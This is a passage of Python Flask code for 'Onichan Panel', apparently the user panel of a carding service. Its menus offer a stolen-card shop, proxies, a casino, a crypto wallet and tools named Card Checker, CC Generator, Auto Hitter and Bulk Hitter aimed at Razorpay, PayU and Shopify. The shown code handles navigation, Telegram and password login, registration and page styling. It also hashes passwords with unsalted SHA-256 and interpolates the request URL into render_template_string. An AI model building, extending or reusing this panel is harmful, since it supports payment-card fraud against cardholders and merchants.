    _shop_keys = {'ccshop', 'purchased', 'proxyshop', 'myproxies'}
    _tools_keys = {'checker', 'masscheck', 'generator', 'autohitter', 'bulkhitter', 'razorpay',
                   'payu', 'shopify', 'cleaner', 'binlookup', 'proxychecker', 'proxygen'}
    _casino_keys = {'casino'}

    def _tab_cls(group):
        return 'class="active"' if active_page in group else ''

    _wallet_keys = {'wallet'}
    bottom_nav = f'''
    <nav class="bottom-nav" role="navigation" aria-label="Primary">
        <a href="/user" {_tab_cls({'dashboard'})} aria-label="Dashboard">
            <span class="ico">🏠</span><span>Home</span>
        </a>
        <a href="/user/ccshop" {_tab_cls(_shop_keys)} aria-label="Shop">
            <span class="ico">🛒</span><span>Shop</span>
        </a>
        <a href="/user/checker" {_tab_cls(_tools_keys)} aria-label="Tools">
            <span class="ico">🛠️</span><span>Tools</span>
        </a>
        <a href="/user/casino" {_tab_cls(_casino_keys)} aria-label="Casino">
            <span class="ico">🎰</span><span>Casino</span>
        </a>
        <a href="/wallet" {_tab_cls(_wallet_keys)} aria-label="Wallet">
            <span class="ico">💰</span><span>Wallet</span>
        </a>
    </nav>
    '''

    mobile_js = '''
    <script>
        function toggleMobileMenu() {
            document.querySelector('.sidebar').classList.toggle('open');
            document.querySelector('.sidebar-overlay').classList.toggle('show');
        }
        function closeMobileMenu() {
            document.querySelector('.sidebar').classList.remove('open');
            document.querySelector('.sidebar-overlay').classList.remove('show');
        }
        function toggleNavSection(el) {
            var section = el.parentElement;
            section.classList.toggle('collapsed');
            try { localStorage.setItem('navSec_' + el.dataset.key, section.classList.contains('collapsed') ? '1' : '0'); } catch(e){}
        }
        document.addEventListener('DOMContentLoaded', function(){
            // Restore collapsed state + wire keyboard activation (Enter/Space)
            document.querySelectorAll('.nav-section-title[data-key]').forEach(function(t){
                try {
                    if (localStorage.getItem('navSec_' + t.dataset.key) === '1') {
                        t.parentElement.classList.add('collapsed');
                    }
                } catch(e){}
                t.addEventListener('keydown', function(ev){
                    if (ev.key === 'Enter' || ev.key === ' ' || ev.key === 'Spacebar') {
                        ev.preventDefault();
                        toggleNavSection(t);
                    }
                });
            });
            // Swipe-left to close drawer
            var sb = document.querySelector('.sidebar');
            if (sb) {
                var sx=0, sy=0, dx=0, dy=0, tracking=false;
                sb.addEventListener('touchstart', function(e){
                    if (!sb.classList.contains('open')) return;
                    var t=e.touches[0]; sx=t.clientX; sy=t.clientY; dx=0; dy=0; tracking=true;
                }, {passive:true});
                sb.addEventListener('touchmove', function(e){
                    if (!tracking) return;
                    var t=e.touches[0]; dx=t.clientX-sx; dy=t.clientY-sy;
                }, {passive:true});
                sb.addEventListener('touchend', function(){
                    if (!tracking) return;
                    if (dx < -60 && Math.abs(dx) > Math.abs(dy)) closeMobileMenu();
                    tracking=false;
                });
            }
        });
    </script>
    '''
    
    return f'''
    {mobile_js}
    <div class="mobile-header">
        <button class="mobile-menu-btn" onclick="toggleMobileMenu()" aria-label="Open menu">☰</button>
        <div class="mobile-title">{page_title}</div>
        <div style="width: 40px;"></div>
    </div>
    <div class="sidebar-overlay" onclick="closeMobileMenu()"></div>
    <div class="sparkles"></div>
    {ANIME_DECORATIONS}
    <aside class="sidebar" aria-label="Sidebar navigation">
        <button type="button" class="sidebar-close" onclick="closeMobileMenu()" aria-label="Close menu">×</button>
        <div class="sidebar-header">
            <h2>Onichan Panel</h2>
            <div class="sidebar-subtitle">Naughty Tools Hub 💕</div>
        </div>
        <div class="nav-section">
            <div class="nav-section-title" data-key="main" onclick="toggleNavSection(this)" role="button" tabindex="0">Main<span class="caret">▾</span></div>
            <div class="nav-section-body">
            {link('dashboard', 'Dashboard', '/user')}
            {link('premium', 'Buy Premium', '/user/premium')}
            {link('wallet', '💰 Crypto Wallet', '/wallet')}
            </div>
        </div>
        <div class="nav-section">
            <div class="nav-section-title" data-key="shop" onclick="toggleNavSection(this)" role="button" tabindex="0">Shop<span class="caret">▾</span></div>
            <div class="nav-section-body">
            {link('ccshop', '🛒 CC Shop', '/user/ccshop')}
            {link('purchased', '📦 My Purchases', '/user/purchased')}
            {link('proxyshop', '🌐 Proxy Shop', '/user/proxyshop')}
            {link('myproxies', '🔑 My Proxies', '/user/myproxies')}
            </div>
        </div>
        <div class="nav-section">
            <div class="nav-section-title" data-key="casino" onclick="toggleNavSection(this)" role="button" tabindex="0">Casino<span class="caret">▾</span></div>
            <div class="nav-section-body">
            {link('casino', '🎰 Casino', '/user/casino')}
            </div>
        </div>
        <div class="nav-section">
            <div class="nav-section-title" data-key="tools" onclick="toggleNavSection(this)" role="button" tabindex="0">Tools<span class="caret">▾</span></div>
            <div class="nav-section-body">
            {link('checker', 'Card Checker', '/user/checker')}
            {link('masscheck', 'Mass Check', '/user/masscheck')}
            {link('generator', 'CC Generator', '/user/generator')}
            {link('autohitter', 'Auto Hitter', '/user/autohitter')}
            {link('bulkhitter', '⚡ Bulk Hitter', '/user/bulkhitter')}
            {link('razorpay', 'Auto Razorpay', '/user/razorpay')}
            {link('payu', 'Auto PayU', '/user/payu')}
            {link('shopify', 'Auto Shopify V2', '/user/shopify')}
            {link('cleaner', 'CC Cleaner', '/user/cleaner')}
            {link('binlookup', 'BIN Lookup', '/user/binlookup')}
            {link('proxychecker', 'Proxy Checker', '/user/proxychecker')}
            {link('proxygen', 'Proxy Generator', '/user/proxygen')}
            </div>
        </div>
        <div class="nav-section">
            <div class="nav-section-title" data-key="account" onclick="toggleNavSection(this)" role="button" tabindex="0">Account<span class="caret">▾</span></div>
            <div class="nav-section-body">
            {link('history', 'Check History', '/user/history')}
            {link('payments', 'My Payments', '/user/payments')}
            {link('settings', 'Settings', '/user/settings')}
            {link('help', '❓ Help & Support', '/user/help')}
            </div>
        </div>
        <a href="/user/logout" style="margin-top: auto;">Logout</a>
    </aside>
    {bottom_nav}
    '''

def get_user_info(user_id):
    from config import DB_OWNER, DB_PREMIUM, DB_FREE, DB_BANNED
    
    user_id_str = str(user_id)
    user_id_int = int(user_id)
    
    try:
        from config import OWNER_ID
        if user_id_int == OWNER_ID:
            return {'type': 'owner', 'premium_expiry': 'Unlimited'}
    except:
        pass
    
    try:
        from modules.database import _execute_with_retry, is_db_connected
        if is_db_connected():
            result = _execute_with_retry(
                "SELECT user_id, status, premium, premium_expiry, is_owner FROM users WHERE user_id = %s",
                (user_id_int,), fetch_one=True
            )
            if result:
                if result.get("is_owner"):
                    return {'type': 'owner', 'premium_expiry': 'Unlimited'}
                if result.get("status") == "banned":
                    return {'type': 'banned', 'premium_expiry': None}
                if result.get("premium"):
                    expiry = result.get("premium_expiry")
                    if expiry:
                        from datetime import datetime as dt
                        if isinstance(expiry, str):
                            expiry_str = expiry[:10]
                        else:
                            expiry_str = expiry.strftime("%Y-%m-%d")
                        try:
                            expiry_dt = dt.strptime(expiry_str, "%Y-%m-%d")
                            if expiry_dt < dt.utcnow():
                                return {'type': 'free', 'premium_expiry': f'Expired ({expiry_str})'}
                        except:
                            pass
                        return {'type': 'premium', 'premium_expiry': expiry_str}
                    return {'type': 'premium', 'premium_expiry': 'N/A'}
                if result.get("status") == "approved":
                    return {'type': 'free', 'premium_expiry': None}
                return {'type': 'free', 'premium_expiry': None}
    except Exception as e:
        print(f"[WebPanel] DB user info check failed: {e}")
    
    # Fallback to file-based check
    banned = read_file_lines(DB_BANNED)
    if user_id_str in banned:
        return {'type': 'banned', 'premium_expiry': None}
    
    owners = read_file_lines(DB_OWNER)
    for owner in owners:
        if owner.split()[0] == user_id_str:
            return {'type': 'owner', 'premium_expiry': 'Unlimited'}
    
    premium = read_file_lines(DB_PREMIUM)
    for p in premium:
        parts = p.split()
        if parts and parts[0] == user_id_str:
            expiry = parts[1] if len(parts) > 1 else 'N/A'
            return {'type': 'premium', 'premium_expiry': expiry}
    
    free = read_file_lines(DB_FREE)
    if user_id_str in free:
        return {'type': 'free', 'premium_expiry': None}
    
    return {'type': 'unknown', 'premium_expiry': None}

def get_user_check_history(user_id, limit=50):
    from config import DB_CHECK_LOG
    history = []
    try:
        lines = read_file_lines(DB_CHECK_LOG)
        for line in reversed(lines):
            if str(user_id) in line:
                history.append(line)
                if len(history) >= limit:
                    break
    except:
        pass
    return history

def get_user_payments(user_id):
    from config import DB_PAYMENTS, DB_CRYPTO_PENDING
    payments = []
    pending = []
    
    try:
        for line in read_file_lines(DB_PAYMENTS):
            if str(user_id) in line:
                payments.append(line)
    except:
        pass
    
    try:
        for line in read_file_lines(DB_CRYPTO_PENDING):
            if str(user_id) in line and 'PENDING' in line:
                pending.append(line)
    except:
        pass
    
    return {'completed': payments[-10:][::-1], 'pending': pending}

def get_user_config(user_id):
    from config import DB_USER_CONFIGS
    try:
        with open(DB_USER_CONFIGS, 'r') as f:
            configs = json.load(f)
            return configs.get(str(user_id), {})
    except:
        return {}

def save_user_config(user_id, config):
    from config import DB_USER_CONFIGS
    try:
        try:
            with open(DB_USER_CONFIGS, 'r') as f:
                configs = json.load(f)
        except:
            configs = {}
        
        configs[str(user_id)] = config
        
        with open(DB_USER_CONFIGS, 'w') as f:
            json.dump(configs, f)
        return True
    except:
        return False

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def get_user_credentials():
    from config import DB_USER_CREDENTIALS
    try:
        with open(DB_USER_CREDENTIALS, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_user_credentials(credentials):
    from config import DB_USER_CREDENTIALS
    try:
        with open(DB_USER_CREDENTIALS, 'w') as f:
            json.dump(credentials, f)
        return True
    except:
        return False

def user_exists(user_id):
    creds = get_user_credentials()
    return str(user_id) in creds

def verify_password(user_id, password):
    creds = get_user_credentials()
    user_data = creds.get(str(user_id))
    if user_data:
        return user_data.get('password') == hash_password(password)
    return False

def register_user(user_id, password):
    creds = get_user_credentials()
    creds[str(user_id)] = {
        'password': hash_password(password),
        'created': datetime.now().isoformat()
    }
    return save_user_credentials(creds)

def verify_telegram_login(data):
    bot_token = os.environ.get('BOT_TOKEN', '')
    check_hash = data.pop('hash', '')
    data_check_arr = sorted([f"{k}={v}" for k, v in data.items()])
    data_check_string = '\n'.join(data_check_arr)
    secret_key = hashlib.sha256(bot_token.encode()).digest()
    hmac_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
    return hmac_hash == check_hash

@app.route('/user/telegram_webapp_login', methods=['POST'])
def telegram_webapp_login():
    init_data = request.form.get('initData', '')
    if not init_data:
        return jsonify({'ok': False, 'error': 'No initData'}), 400
    
    import urllib.parse
    bot_token = os.environ.get('BOT_TOKEN', '')
    parsed = dict(urllib.parse.parse_qsl(init_data))
    
    check_hash = parsed.pop('hash', '')
    data_check_arr = sorted([f"{k}={v}" for k, v in parsed.items()])
    data_check_string = '\n'.join(data_check_arr)
    
    secret_key = hmac.new(b'WebAppData', bot_token.encode(), hashlib.sha256).digest()
    computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
    
    if computed_hash != check_hash:
        return jsonify({'ok': False, 'error': 'Verification failed'}), 403
    
    import time
    try:
        auth_date = int(parsed.get('auth_date', 0))
        if time.time() - auth_date > 86400:
            return jsonify({'ok': False, 'error': 'Data expired'}), 403
    except:
        pass
    
    user_data = parsed.get('user', '')
    if user_data:
        user_obj = json.loads(user_data)
        user_id = str(user_obj.get('id', ''))
    else:
        return jsonify({'ok': False, 'error': 'No user data'}), 400
    
    if not user_id:
        return jsonify({'ok': False, 'error': 'No user ID'}), 400
    
    if not user_exists(user_id):
        import secrets as sec
        register_user(user_id, sec.token_hex(8))
    
    user_info = get_user_info(user_id)
    if user_info['type'] == 'banned':
        return jsonify({'ok': False, 'error': 'Account banned'}), 403
    
    session.permanent = True
    session['user_id'] = user_id
    return jsonify({'ok': True, 'redirect': '/user'})

@app.route('/user/telegram_callback')
def telegram_callback():
    tg_data = {}
    for key in ['id', 'first_name', 'last_name', 'username', 'photo_url', 'auth_date', 'hash']:
        val = request.args.get(key)
        if val:
            tg_data[key] = val
    
    if not tg_data.get('id') or not tg_data.get('hash'):
        return redirect('/user/login?error=invalid_telegram')
    
    import time
    try:
        auth_date = int(tg_data.get('auth_date', 0))
        if time.time() - auth_date > 86400:
            return redirect('/user/login?error=expired')
    except:
        pass
    
    if not verify_telegram_login(dict(tg_data)):
        return redirect('/user/login?error=verification_failed')
    
    user_id = str(tg_data['id'])
    
    if not user_exists(user_id):
        import secrets
        random_pass = secrets.token_hex(8)
        register_user(user_id, random_pass)
    
    user_info = get_user_info(user_id)
    if user_info['type'] == 'banned':
        return redirect('/user/login?error=banned')
    
    session.permanent = True
    session['user_id'] = user_id
    return redirect('/user')

@app.route('/user/login', methods=['GET', 'POST'])
def user_login():
    error = ""
    tg_error = request.args.get('error', '')
    if tg_error == 'invalid_telegram':
        error = "Invalid Telegram login data"
    elif tg_error == 'expired':
        error = "Telegram login expired. Please try again."
    elif tg_error == 'verification_failed':
        error = "Could not verify Telegram login"
    elif tg_error == 'banned':
        error = "This account has been banned!"
    if request.method == 'POST':
        user_id = request.form.get('user_id', '').strip()
        password = request.form.get('password', '')
        
        if not user_id or not user_id.isdigit() or len(user_id) < 5:
            error = "Please enter a valid Telegram User ID"
        elif not password:
            error = "Please enter your password"
        else:
            user_info = get_user_info(user_id)
            if user_info['type'] == 'banned':
                error = "This account has been banned!"
            elif not user_exists(user_id):
                error = "Account not found. Please register first."
            elif not verify_password(user_id, password):
                error = "Incorrect password"
            else:
                session.permanent = True
                session['user_id'] = user_id
                return redirect('/user')
    
    return render_template_string(f"""
    <html>
    <head>
        <title>Login - Onichan</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        {USER_CSS}
        <style>
            .tg-auto-login {{
                position:fixed;top:0;left:0;width:100%;height:100%;background:#1a0a2e;display:flex;align-items:center;justify-content:center;z-index:9999;flex-direction:column;gap:16px;
            }}
            .tg-auto-login .spinner-big {{
                width:40px;height:40px;border:4px solid rgba(255,105,180,0.3);border-top:4px solid #ff69b4;border-radius:50%;animation:spin 0.8s linear infinite;
            }}
            @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
            .tg-auto-login p {{ color:rgba(255,255,255,0.7);font-family:'Nunito',sans-serif;font-size:0.95em; }}
            .login-page {{
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
                position: relative;
                overflow: hidden;
            }}
            
            .floating-hearts {{
                position: fixed;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                pointer-events: none;
                z-index: 1;
            }}
            
            .heart {{
                position: absolute;
                font-size: 20px;
                animation: floatUp 6s ease-in infinite;
                opacity: 0;
            }}
            
            @keyframes floatUp {{
                0% {{ 
                    transform: translateY(100vh) rotate(0deg) scale(0.5);
                    opacity: 0;
                }}
                10% {{ opacity: 0.8; }}
                90% {{ opacity: 0.8; }}
                100% {{ 
                    transform: translateY(-20vh) rotate(360deg) scale(1.2);
                    opacity: 0;
                }}
            }}
            
            .login-box {{
                background: linear-gradient(145deg, rgba(45,27,61,0.9) 0%, rgba(30,15,45,0.95) 100%);
                border: 2px solid transparent;
                background-clip: padding-box;
                position: relative;
                padding: 40px 35px;
                border-radius: 25px;
                width: 100%;
                max-width: 380px;
                text-align: center;
                backdrop-filter: blur(20px);
                box-shadow: 
                    0 0 40px rgba(255,20,147,0.2),
                    0 0 80px rgba(138,43,226,0.1),
                    inset 0 0 60px rgba(255,105,180,0.05);
                animation: boxGlow 3s ease-in-out infinite alternate;
                z-index: 10;
            }}
            
            .login-box::before {{
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, #ff1493, #ff69b4, #ba55d3, #9370db, #ff1493);
                background-size: 300% 300%;
                border-radius: 27px;
                z-index: -1;
                animation: borderGlow 4s ease infinite;
            }}
            
            @keyframes boxGlow {{
                0% {{ box-shadow: 0 0 40px rgba(255,20,147,0.2), 0 0 80px rgba(138,43,226,0.1); }}
                100% {{ box-shadow: 0 0 60px rgba(255,20,147,0.4), 0 0 100px rgba(138,43,226,0.2); }}
            }}
            
            @keyframes borderGlow {{
                0%, 100% {{ background-position: 0% 50%; }}
                50% {{ background-position: 100% 50%; }}
            }}
            
            .login-box h1 {{
                font-size: 2.2em;
                font-weight: 800;
                background: linear-gradient(135deg, #ff69b4, #ff1493, #da70d6);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 8px;
                text-shadow: 0 0 30px rgba(255,105,180,0.5);
                animation: titlePulse 2s ease-in-out infinite;
            }}
            
            @keyframes titlePulse {{
                0%, 100% {{ transform: scale(1); }}
                50% {{ transform: scale(1.02); }}
            }}
            
            .login-icon {{
                font-size: 50px;
                margin-bottom: 15px;
                animation: bounce 2s ease-in-out infinite;
            }}
            
            @keyframes bounce {{
                0%, 100% {{ transform: translateY(0); }}
                50% {{ transform: translateY(-10px); }}
            }}
            
            .login-box p {{
                color: rgba(255,255,255,0.7);
                margin-bottom: 25px;
                font-size: 0.95em;
            }}
            
            .login-box input {{
                width: 100%;
                padding: 15px 20px;
                margin-bottom: 15px;
                border: 2px solid rgba(255,105,180,0.3);
                border-radius: 15px;
                background: rgba(0,0,0,0.3);
                color: #fff;
                font-size: 1em;
                transition: all 0.3s ease;
                font-family: inherit;
            }}
            
            .login-box input:focus {{
                outline: none;
                border-color: #ff69b4;
                box-shadow: 0 0 20px rgba(255,105,180,0.3);
                background: rgba(0,0,0,0.4);
            }}
            
            .login-box input::placeholder {{
                color: rgba(255,255,255,0.5);
            }}
            
            .login-box .btn-primary {{
                width: 100%;
                padding: 15px;
                border: none;
                border-radius: 15px;
                background: linear-gradient(135deg, #ff1493, #ff69b4);
                color: white;
                font-size: 1.1em;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
                position: relative;
                overflow: hidden;
            }}
            
            .login-box .btn-primary::before {{
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                transition: left 0.5s;
            }}
            
            .login-box .btn-primary:hover {{
                transform: translateY(-3px);
                box-shadow: 0 10px 30px rgba(255,20,147,0.4);
            }}
            
            .login-box .btn-primary:hover::before {{
                left: 100%;
            }}
            
            .login-box .btn-primary:active {{
                transform: translateY(-1px);
            }}
            
            .sparkle-container {{
                position: absolute;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                pointer-events: none;
                overflow: hidden;
            }}
            
            .sparkle {{
                position: absolute;
                width: 6px;
                height: 6px;
                background: #fff;
                border-radius: 50%;
                animation: sparkleAnim 2s ease-in-out infinite;
            }}
            
            @keyframes sparkleAnim {{
                0%, 100% {{ opacity: 0; transform: scale(0); }}
                50% {{ opacity: 1; transform: scale(1); }}
            }}
            
            .register-link {{
                color: #ff69b4 !important;
                text-decoration: none;
                font-weight: 600;
                transition: all 0.3s;
                display: inline-block;
            }}
            
            .register-link:hover {{
                color: #ff1493 !important;
                text-shadow: 0 0 10px rgba(255,105,180,0.5);
                transform: scale(1.05);
            }}
            
            .help-text {{
                font-size: 0.85em;
                opacity: 0.6;
                margin-top: 15px;
            }}
            
            .alert {{
                padding: 12px;
                border-radius: 10px;
                margin-bottom: 20px;
                animation: shake 0.5s ease-in-out;
            }}
            
            .alert-error {{
                background: rgba(255,0,0,0.2);
                border: 1px solid rgba(255,0,0,0.4);
                color: #ff6b6b;
            }}
            
            @keyframes shake {{
                0%, 100% {{ transform: translateX(0); }}
                25% {{ transform: translateX(-5px); }}
                75% {{ transform: translateX(5px); }}
            }}
        </style>
    </head>
    <body>
        <div id="tg-auto-overlay" class="tg-auto-login" style="display:none;">
            <div class="spinner-big"></div>
            <p id="tg-auto-msg">Logging in via Telegram...</p>
        </div>
        <div class="floating-hearts">
            <div class="heart" style="left: 5%; animation-delay: 0s;">💕</div>
            <div class="heart" style="left: 15%; animation-delay: 1s;">💖</div>
            <div class="heart" style="left: 25%; animation-delay: 2s;">✨</div>
            <div class="heart" style="left: 35%; animation-delay: 0.5s;">💗</div>
            <div class="heart" style="left: 45%; animation-delay: 3s;">🌸</div>
            <div class="heart" style="left: 55%; animation-delay: 1.5s;">💝</div>
            <div class="heart" style="left: 65%; animation-delay: 2.5s;">⭐</div>
            <div class="heart" style="left: 75%; animation-delay: 0.8s;">💕</div>
            <div class="heart" style="left: 85%; animation-delay: 3.5s;">💖</div>
            <div class="heart" style="left: 95%; animation-delay: 4s;">✨</div>
        </div>
        <div class="login-page">
            <div class="login-box">
                <div class="sparkle-container">
                    <div class="sparkle" style="top: 10%; left: 10%; animation-delay: 0s;"></div>
                    <div class="sparkle" style="top: 20%; right: 15%; animation-delay: 0.5s;"></div>
                    <div class="sparkle" style="bottom: 30%; left: 20%; animation-delay: 1s;"></div>
                    <div class="sparkle" style="bottom: 15%; right: 10%; animation-delay: 1.5s;"></div>
                </div>
                <div class="login-icon">🌸</div>
                <h1>Onichan Panel</h1>
                <p>Login with your Telegram User ID</p>
                {'<div class="alert alert-error">' + error + '</div>' if error else ''}
                <form method="POST">
                    <input type="text" name="user_id" placeholder="✨ Telegram User ID" required inputmode="numeric">
                    <input type="password" name="password" placeholder="🔐 Password" required>
                    <button type="submit" class="btn btn-primary">💖 Login</button>
                </form>
                <div style="display:flex;align-items:center;gap:12px;margin:20px 0 15px;">
                    <div style="flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(255,105,180,0.4),transparent);"></div>
                    <span style="color:rgba(255,255,255,0.5);font-size:0.85em;font-weight:600;">OR</span>
                    <div style="flex:1;height:1px;background:linear-gradient(90deg,transparent,rgba(255,105,180,0.4),transparent);"></div>
                </div>
                <div id="tg-btn-area" style="display:flex;justify-content:center;"></div>
                <p style="margin-top: 20px;">
                    <a href="/user/register" class="register-link">Don't have an account? Register ✨</a>
                </p>
                <p class="help-text">
                    Get your ID: Send /myid to @Onichanbabybot
                </p>
            </div>
        </div>
        <script>
        (function(){{
            var tg = window.Telegram && window.Telegram.WebApp;
            if (tg && tg.initData && tg.initData.length > 0) {{
                var overlay = document.getElementById('tg-auto-overlay');
                overlay.style.display = 'flex';
                var fd = new FormData();
                fd.append('initData', tg.initData);
                fetch('/user/telegram_webapp_login', {{method:'POST', body:fd}})
                .then(function(r){{ return r.json(); }})
                .then(function(d){{
                    if (d.ok) {{
                        window.location.href = d.redirect;
                    }} else {{
                        overlay.style.display = 'none';
                    }}
                }})
                .catch(function(){{
                    overlay.style.display = 'none';
                }});
            }} else {{
                var area = document.getElementById('tg-btn-area');
                var s = document.createElement('script');
                s.src = 'https://telegram.org/js/telegram-widget.js?22';
                s.setAttribute('data-telegram-login', 'Onichanbabybot');
                s.setAttribute('data-size', 'large');
                s.setAttribute('data-radius', '14');
                s.setAttribute('data-auth-url', '{request.url_root.rstrip("/")}/user/telegram_callback');
                s.setAttribute('data-request-access', 'write');
                s.async = true;
                area.appendChild(s);
            }}
        }})();
        </script>
    </body>
    </html>
    """)

@app.route('/user/register', methods=['GET', 'POST'])
def user_register():
    error = ""
    success = ""
    if request.method == 'POST':
        user_id = request.form.get('user_id', '').strip()
        password = request.form.get('password', '')
        confirm = request.form.get('confirm_password', '')
        
        if not user_id or not user_id.isdigit() or len(user_id) < 5:
            error = "Please enter a valid Telegram User ID"
        elif len(password) < 4:
            error = "Password must be at least 4 characters"
        elif password != confirm:
            error = "Passwords do not match"
        elif user_exists(user_id):
            error = "Account already exists. Please login."
        else:
            user_info = get_user_info(user_id)
            if user_info['type'] == 'banned':
                error = "This User ID has been banned"
            elif register_user(user_id, password):
                success = "Account created! You can now login."
            else:
                error = "Registration failed. Please try again."
    
    return render_template_string(f"""
    <html>
    <head>
        <title>Register - Onichan</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        {USER_CSS}
        <style>
            .tg-auto-login {{
                position:fixed;top:0;left:0;width:100%;height:100%;background:#1a0a2e;display:flex;align-items:center;justify-content:center;z-index:9999;flex-direction:column;gap:16px;
            }}
            .tg-auto-login .spinner-big {{
                width:40px;height:40px;border:4px solid rgba(186,85,211,0.3);border-top:4px solid #ba55d3;border-radius:50%;animation:spin 0.8s linear infinite;
            }}
            @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
            .tg-auto-login p {{ color:rgba(255,255,255,0.7);font-family:'Nunito',sans-serif;font-size:0.95em; }}
            .login-page {{
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
                position: relative;
                overflow: hidden;
            }}
            
            .floating-hearts {{
                position: fixed;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                pointer-events: none;
                z-index: 1;
            }}
            
            .heart {{
                position: absolute;
                font-size: 20px;
                animation: floatUp 6s ease-in infinite;
                opacity: 0;
            }}
            
            @keyframes floatUp {{
                0% {{ 
                    transform: translateY(100vh) rotate(0deg) scale(0.5);
                    opacity: 0;
                }}
                10% {{ opacity: 0.8; }}
                90% {{ opacity: 0.8; }}
                100% {{ 
                    transform: translateY(-20vh) rotate(360deg) scale(1.2);
                    opacity: 0;
                }}
            }}
            
            .login-box {{
                background: linear-gradient(145deg, rgba(45,27,61,0.9) 0%, rgba(30,15,45,0.95) 100%);
                border: 2px solid transparent;
                background-clip: padding-box;
                position: relative;
                padding: 40px 35px;
                border-radius: 25px;
                width: 100%;
                max-width: 380px;
                text-align: center;
                backdrop-filter: blur(20px);
                box-shadow: 
                    0 0 40px rgba(255,20,147,0.2),
                    0 0 80px rgba(138,43,226,0.1),
                    inset 0 0 60px rgba(255,105,180,0.05);
                animation: boxGlow 3s ease-in-out infinite alternate;
                z-index: 10;
            }}
            
            .login-box::before {{
                content: '';
                position: absolute;
                top: -2px;
                left: -2px;
                right: -2px;
                bottom: -2px;
                background: linear-gradient(45deg, #ba55d3, #9370db, #ff1493, #ff69b4, #ba55d3);
                background-size: 300% 300%;
                border-radius: 27px;
                z-index: -1;
                animation: borderGlow 4s ease infinite;
            }}
            
            @keyframes boxGlow {{
                0% {{ box-shadow: 0 0 40px rgba(255,20,147,0.2), 0 0 80px rgba(138,43,226,0.1); }}
                100% {{ box-shadow: 0 0 60px rgba(255,20,147,0.4), 0 0 100px rgba(138,43,226,0.2); }}
            }}
            
            @keyframes borderGlow {{
                0%, 100% {{ background-position: 0% 50%; }}
                50% {{ background-position: 100% 50%; }}
            }}
            
            .login-box h1 {{
                font-size: 2.2em;
                font-weight: 800;
                background: linear-gradient(135deg, #da70d6, #ba55d3, #ff69b4);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                margin-bottom: 8px;
                text-shadow: 0 0 30px rgba(255,105,180,0.5);
                animation: titlePulse 2s ease-in-out infinite;
            }}
            
            @keyframes titlePulse {{
                0%, 100% {{ transform: scale(1); }}
                50% {{ transform: scale(1.02); }}
            }}
            
            .login-icon {{
                font-size: 50px;
                margin-bottom: 15px;
                animation: bounce 2s ease-in-out infinite;
            }}
            
            @keyframes bounce {{
                0%, 100% {{ transform: translateY(0); }}
                50% {{ transform: translateY(-10px); }}
            }}
            
            .login-box p {{
                color: rgba(255,255,255,0.7);
                margin-bottom: 25px;
                font-size: 0.95em;
            }}
            
            .login-box input {{
                width: 100%;
                padding: 15px 20px;
                margin-bottom: 15px;
                border: 2px solid rgba(186,85,211,0.3);
                border-radius: 15px;
                background: rgba(0,0,0,0.3);
                color: #fff;
                font-size: 1em;
                transition: all 0.3s ease;
                font-family: inherit;
            }}
            
            .login-box input:focus {{
                outline: none;
                border-color: #ba55d3;
                box-shadow: 0 0 20px rgba(186,85,211,0.3);
                background: rgba(0,0,0,0.4);
            }}
            
            .login-box input::placeholder {{
                color: rgba(255,255,255,0.5);
            }}
            
            .login-box .btn-primary {{
                width: 100%;
                padding: 15px;
                border: none;
                border-radius: 15px;
                background: linear-gradient(135deg, #ba55d3, #9370db);
                color: white;
                font-size: 1.1em;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.3s ease;
                text-transform: uppercase;
                letter-spacing: 1px;
                position: relative;
                overflow: hidden;
            }}
            
            .login-box .btn-primary::before {{
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
                transition: left 0.5s;
            }}
            
            .login-box .btn-primary:hover {{
                transform: translateY(-3px);
                box-shadow: 0 10px 30px rgba(186,85,211,0.4);
            }}
            
            .login-box .btn-primary:hover::before {{
                left: 100%;
            }}
            
            .login-box .btn-primary:active {{
                transform: translateY(-1px);
            }}
            
            .sparkle-container {{
                position: absolute;
                width: 100%;
                height: 100%;
                top: 0;
                left: 0;
                pointer-events: none;
                overflow: hidden;
            }}
            
            .sparkle {{
                position: absolute;
                width: 6px;
                height: 6px;
                background: #fff;
                border-radius: 50%;
                animation: sparkleAnim 2s ease-in-out infinite;
            }}
            
            @keyframes sparkleAnim {{
                0%, 100% {{ opacity: 0; transform: scale(0); }}
                50% {{ opacity: 1; transform: scale(1); }}
            }}
            
            .login-link {{
                color: #ba55d3 !important;
                text-decoration: none;
                font-weight: 600;
                transition: all 0.3s;
                display: inline-block;
            }}
            
            .login-link:hover {{
                color: #da70d6 !important;
                text-shadow: 0 0 10px rgba(186,85,211,0.5);
                transform: scale(1.05);
            }}
            
            .help-text {{
                font-size: 0.85em;
                opacity: 0.6;
                margin-top: 15px;
            }}
            
            .alert {{
                padding: 12px;
                border-radius: 10px;
                margin-bottom: 20px;
                animation: shake 0.5s ease-in-out;
            }}
            
            .alert-error {{
                background: rgba(255,0,0,0.2);
                border: 1px solid rgba(255,0,0,0.4);
                color: #ff6b6b;
            }}
            
            .alert-success {{
